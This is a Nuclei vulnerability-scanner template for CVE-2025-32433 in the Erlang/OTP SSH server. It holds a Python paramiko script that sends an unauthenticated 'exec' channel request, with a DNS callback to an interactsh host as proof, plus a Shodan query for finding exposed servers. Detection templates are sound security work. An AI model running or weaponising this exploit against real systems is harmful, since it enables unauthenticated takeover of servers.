id: CVE-2025-32433

info:
  name: Erlang/OTP SSH Server - Remote Code Execution
  author: darses
  severity: critical
  description: |
    A serious vulnerability has been identified in the Erlang/OTP SSH server that may allow an attacker to perform unauthenticated remote code execution (RCE). By exploiting a flaw in SSH protocol message handling, a malicious actor could gain unauthorized access to affected systems and execute arbitrary commands without valid credentials.
  reference:
    - https://github.com/erlang/otp/security/advisories/GHSA-37cp-fgq5-7wc2
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cve-id: CVE-2025-32433
    cwe-id: CWE-306
  metadata:
    verified: true
    shodan-query: "SSH-2.0-Erlang"
  tags: network,ssh,code,tcp,oob,rce

variables:
  command: "inet:gethostbyname('{{interactsh-url}}')."

flow: tcp(1) && code(1)

tcp:
  - host:
      - "{{Hostname}}"
    port: 22

    read-size: 1024

    matchers:
      - type: word
        internal: true
        words:
          - "SSH-2.0"

code:
  - engine:
      - py
      - python3

    source: |
      import os
      import socket
      import paramiko
      import threading
      import time

      command = os.getenv('command')
      hostname = os.getenv('Hostname')
      port = 22
      if hostname.startswith('['):
          # IPv6 address
          end_bracket = hostname.find(']')
          if end_bracket != -1 and len(hostname) > end_bracket + 2 and hostname[end_bracket + 1] == ':':
              port = int(hostname[end_bracket + 2:])
              hostname = hostname[1:end_bracket]
      elif ':' in hostname:
          # IPv4 or hostname with port
          hostname, port_str = hostname.rsplit(':', 1)
          port = int(port_str)
      client_socket = socket.create_connection((hostname, port))

      print("Connect to SSH Server")
      transport = paramiko.Transport(client_socket)
      transport.start_client()
      time.sleep(1)

      print("Create new SSH channel 'session'")
      transport.lock.acquire()
      try:
          window_size = transport._sanitize_window_size(None)
          max_packet_size = transport._sanitize_packet_size(None)
          chanid = transport._next_channel()
          m = paramiko.message.Message()
          m.add_byte(paramiko.common.cMSG_CHANNEL_OPEN)
          m.add_string("session")
          m.add_int(chanid)
          m.add_int(window_size)
          m.add_int(max_packet_size)
          chan = paramiko.channel.Channel(chanid)
          transport._channels.put(chanid, chan)
          transport.channel_events[chanid] = event = threading.Event()
          transport.channels_seen[chanid] = True
          chan._set_transport(transport)
          chan._set_window(window_size, max_packet_size)
          transport._send_user_message(m)
          chan = transport._channels.get(chanid)
      finally:
          transport.lock.release()
      chan.transport._send_user_message(m)
      time.sleep(1)

      print("Send exec message on channel")
      m = paramiko.message.Message()
      m.add_byte(paramiko.common.cMSG_CHANNEL_REQUEST)
      m.add_int(chanid)
      m.add_string("exec")
      m.add_boolean(True)
      m.add_string(command)
      chan._event_pending()
      chan.transport._send_user_message(m)
      time.sleep(1)
      transport.close()

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
